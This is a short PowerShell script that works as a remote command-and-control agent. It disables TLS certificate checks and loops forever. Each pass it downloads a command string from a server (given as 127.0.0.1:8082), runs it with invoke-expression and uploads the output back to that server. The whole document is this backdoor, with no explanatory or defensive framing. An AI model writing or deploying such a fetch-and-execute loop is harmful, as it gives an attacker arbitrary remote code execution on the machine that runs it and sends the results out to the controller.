$server = "https://127.0.0.1:8082"
while($true)
{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object Net.WebClient
$result = $wc.DownloadString("$server/fetch")
while($result) {
	$output = invoke-expression $result | out-string 
	$wc.UploadString("$server/response", $output)	
	break
}
}
